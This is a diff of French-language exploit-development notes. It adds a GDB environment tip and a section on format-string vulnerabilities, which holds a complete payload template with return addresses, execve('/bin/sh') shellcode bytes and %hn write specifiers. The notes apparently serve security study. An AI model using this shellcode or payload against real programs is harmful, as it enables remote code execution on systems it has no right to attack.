@@ -22,6 +22,8 @@ Trouver un jmp avec mona dans un module spécifique:
 !mona jmp -!mona jmp -r esp -m user32.dll
 ```
 
+Quand on teste un payload avec GDB il faut prendre en compte les variables d'environnement qui sont différentes dans GDB et dans un terminal "normal". Une astuce est de setter temporairement des variables dans le terminal normal (il y a notamment les variables COLUMNS et LINES qui sont présentes dans GDB)
+
 ### Bad characters
 
 Pour rechercher des bad chars on peut générer un payload avec mona:
@@ -110,6 +112,29 @@ Les commandes mona suivantes sont utiles pour les exploits ROP:
 ## Heap Spraying
 
 Le Heap Spraying est une méthode utilisée pour mettre le shellcode en mémoire. Via du JavaScript on met le shellcode précédé d'un large nopsled. Ceci permet de mettre dans EIP une adresse où on a une forte chance de tomber sur le nopsled.
+
+## Format String
+
+Une vulnérabilité de type format string permet de lire du contenu en mémoire mais aussi de le modifier ce qui permet de faire un RCE.
+
+Format général du payload:
+
+``` bash
+'\xee\xf7\xff\xbf'
+'\xec\xf7\xff\xbf'
+'AAAA\xcc\xcc'
+'\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f' '\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'
+'%49098d'
+'%4\$hn'
+'%14349d'
+'%5\$hn
+[Saved EIP+2][Saved EIP][SHELLCODE][%Xd][%4$hn][%Yd][%5$hn]
+```
+- %4hn & %5hn: le hn indique de modifier le 4/5e half-byte sur la stack et d'y mettre le nombre de caractère précédents.
+- %Xd & %Yd: permettent de générer X et Y caractères.
+
+### Références
+- [Les failles Format String](https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Les%20failles%20Format%20String.pdf)
 
 ## Contournement de protections
 
